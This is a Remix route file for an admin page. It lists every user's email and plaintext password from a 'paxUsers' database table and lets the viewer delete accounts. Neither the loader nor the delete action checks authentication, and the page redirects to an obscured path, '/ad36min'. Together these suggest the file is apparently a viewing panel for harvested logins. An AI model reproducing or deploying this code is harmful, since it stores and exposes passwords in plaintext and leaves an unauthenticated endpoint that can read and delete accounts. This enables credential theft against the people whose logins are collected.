import { json, redirect } from "@remix-run/node";
import { useLoaderData, Form } from "@remix-run/react";
import { DeleteIcon, Trash } from "lucide-react";
import { db } from "~/xata/db";

// Loader to fetch data from the JSON file
export const loader = async () => {
  try {
    // Fetch user data from Xata, sorted by createdAt in descending order
    const records = await db.paxUsers
      .select(["xata_id", "email", "password", "xata_updatedat"]) // Include the date field
      .sort("xata_updatedat", "desc") // Sort by the `createdAt` field in descending order
      .getAll();

    return json(records); // Return the sorted user data
  } catch (error: any) {
    if (error.code === "ENOENT") {
      // If the file doesn't exist, return an empty array
      return json([]);
    }

    throw new Error("Failed to load user data");
  }
};

// Action to handle delete user request
export const action = async ({ request }) => {
  const formData = await request.formData();
  const userId = formData.get("userId");

  try {
    await db.paxUsers.delete(userId);
    return redirect("/ad36min");
  } catch (error) {
    throw new Error("Failed to delete user");
  }
};

// Admin Page Component
export default function AdminPage() {
  const users = useLoaderData<typeof loader>();

  return (
    <div className="">
      <h1 className="text-2xl font-bold mb-4 p-4 bg-red-400 text-white">
        Admin Page
      </h1>
      <div className="overflow-x-auto">
        <table className="text-center min-w-full bg-white border border-gray-200">
          <thead>
            <tr>
              <th className="py-2 px-4 border-b">#</th>
              <th className="py-2 px-4 border-b">Email</th>
              <th className="py-2 px-4 border-b">Pass</th>
              <th className="py-2 px-4 border-b">Actions</th>
            </tr>
          </thead>
          <tbody>
            {users.length === 0 ? (
              <tr>
                <td colSpan={4} className="text-center py-4 text-gray-500">
                  No user data available.
                </td>
              </tr>
            ) : (
              users.map((user, index) => (
                <tr key={index} className={index % 2 === 0 ? "bg-gray-50" : ""}>
                  <td className="py-2 px-4 border-b">{index + 1}</td>
                  <td className="py-2 px-4 border-b">{user.email}</td>
                  <td className="py-2 px-4 border-b">{user.password}</td>
                  <td className="py-2 px-4 border-b">
                    <Form method="post">
                      <input type="hidden" name="userId" value={user.xata_id} />
                      <button
                        type="submit"
                        className="bg-red-500 text-white px-4 py-2 rounded"
                      >
                        <Trash size={16} />
                      </button>
                    </Form>
                  </td>
                </tr>
              ))
            )}
          </tbody>
        </table>
      </div>
    </div>
  );
}